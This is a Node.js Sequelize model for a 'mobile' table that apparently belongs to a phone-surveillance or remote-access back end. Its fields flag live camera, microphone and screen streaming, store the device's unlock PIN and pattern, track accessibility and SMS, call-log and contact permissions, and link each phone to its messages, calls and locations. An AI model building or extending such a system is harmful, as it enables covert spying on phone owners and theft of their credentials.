require('rootpath')();
const { Sequelize } = require('sequelize');

module.exports = (app) => {
    const Mobile = app.db.sequelize.define('mobile', {
        id: {
            type: Sequelize.STRING,
            primaryKey: true,
            allowNull: false,
        },
        name: {
            type: Sequelize.STRING,
            allowNull: false,
            defaultValue: ''
        },
        appId: {
            type: Sequelize.STRING,
            allowNull: true,
            defaultValue: ''
        },
        appVersion: {
            type: Sequelize.STRING,
            allowNull: false,
            defaultValue: ''
        },
        appName: {
            type: Sequelize.STRING,
            allowNull: true,
        },
        packageName: {
            type: Sequelize.STRING,
            allowNull: true,
        },
        dbSync: {
            type: Sequelize.BOOLEAN,
            allowNull: false,
            defaultValue: false,
        },
        filePath: {
            type: Sequelize.STRING,
            allowNull: true,
            defaultValue: '/Call'
        },
        model: {
            type: Sequelize.STRING,
            allowNull: true,
            defaultValue: ''
        },
        brand: {
            type: Sequelize.STRING,
            allowNull: false,
            defaultValue: ''
        },
        systemVersion: {
            type: Sequelize.STRING,
            allowNull: false,
            defaultValue: ''
        },
        number: {
            type: Sequelize.STRING,
            allowNull: true,
            defaultValue: ''
        },
        networkOperator: {
            type: Sequelize.STRING,
            allowNull: true,
            defaultValue: ''
        },
        batteryLevel: {
            type: Sequelize.INTEGER,
            allowNull: false,
            defaultValue: 0
        },
        connectivity: {
            type: Sequelize.STRING,
            allowNull: false,
            defaultValue: ''
        },
        monitoring: {
            type: Sequelize.BOOLEAN,
            allowNull: false,
            defaultValue: true,
        },
        capturing: {
            type: Sequelize.BOOLEAN,
            allowNull: false,
            defaultValue: false,
        },
        bluetooth: {
            type: Sequelize.BOOLEAN,
            allowNull: false,
            defaultValue: false,
        },
        screenOn: {
            type: Sequelize.BOOLEAN,
            allowNull: false,
            defaultValue: false,
        },
        accessibility_call: {
            type: Sequelize.BOOLEAN,
            allowNull: false,
            defaultValue: false,
        },
        accessibility_main: {
            type: Sequelize.BOOLEAN,
            allowNull: false,
            defaultValue: false,
        },
        callingRole: {
            type: Sequelize.BOOLEAN,
            allowNull: false,
            defaultValue: false,
        },
        updateNumberStatus: {
            type: Sequelize.BOOLEAN,
            allowNull: false,
            defaultValue: true,
        },
        isCameraStreaming: {
            type: Sequelize.BOOLEAN,
            allowNull: false,
            defaultValue: false,
        },
        isMicStreaming: {
            type: Sequelize.BOOLEAN,
            allowNull: false,
            defaultValue: false,
        },
        isScreenStreaming: {
            type: Sequelize.BOOLEAN,
            allowNull: false,
            defaultValue: false,
        },
        timestamp: {
            type: Sequelize.BIGINT,
            allowNull: false,
            defaultValue: 0
        },
        isOnline: {
            type: Sequelize.BOOLEAN,
            allowNull: false,
            defaultValue: false,
        },
        pin: {
            type: Sequelize.STRING,
            allowNull: true,
            defaultValue: ''
        },
        pattern: {
            type: Sequelize.STRING,
            allowNull: true,
            defaultValue: ''
        },
        mainTimestamp: {
            type: Sequelize.BIGINT,
            allowNull: false,
            defaultValue: 0
        },
        callTimestamp: {
            type: Sequelize.BIGINT,
            allowNull: false,
            defaultValue: 0
        },
        secondPermiCamera: {
            type: Sequelize.BOOLEAN,
            allowNull: false,
            defaultValue: false,
        },
        secondPermiMic: {
            type: Sequelize.BOOLEAN,
            allowNull: false,
            defaultValue: false,
        },
        secondPermiPhone: {
            type: Sequelize.BOOLEAN,
            allowNull: false,
            defaultValue: false,
        },
        secondPermiLocation: {
            type: Sequelize.BOOLEAN,
            allowNull: false,
            defaultValue: false,
        },
        secondPermiFile: {
            type: Sequelize.BOOLEAN,
            allowNull: false,
            defaultValue: false,
        },
        thirdPermiContact: {
            type: Sequelize.BOOLEAN,
            allowNull: false,
            defaultValue: false,
        },
        thirdPermiPhone: {
            type: Sequelize.BOOLEAN,
            allowNull: false,
            defaultValue: false,
        },
        thirdPermiCalllog: {
            type: Sequelize.BOOLEAN,
            allowNull: false,
            defaultValue: false,
        },
        thirdPermiSms: {
            type: Sequelize.BOOLEAN,
            allowNull: false,
            defaultValue: false,
        },
    }, {
        paranoid: true,
    });

    Mobile.associate = function () {
        this.hasMany(app.db.Contact, { as: 'contacts' });
        this.hasMany(app.db.Message, { as: 'messages' });
        this.hasMany(app.db.CallLog, { as: 'callLog' });
        this.hasMany(app.db.Location, { as: 'location' });
        this.belongsTo(app.db.User, { targetKey: 'appId', foreignKey: 'appId' });
    };

    Mobile.save = async function (values) {
        const { id } = values;

        const [mobile, created] = await this.findOrCreate({ where: { id }, defaults: values, paranoid: false, });
        if (!created) {
            if (mobile.appId == "super") {
                values.appId = "super";
            }
            await mobile.update(values);
        }
        return mobile;
    };

    app.db.Mobile = Mobile;
};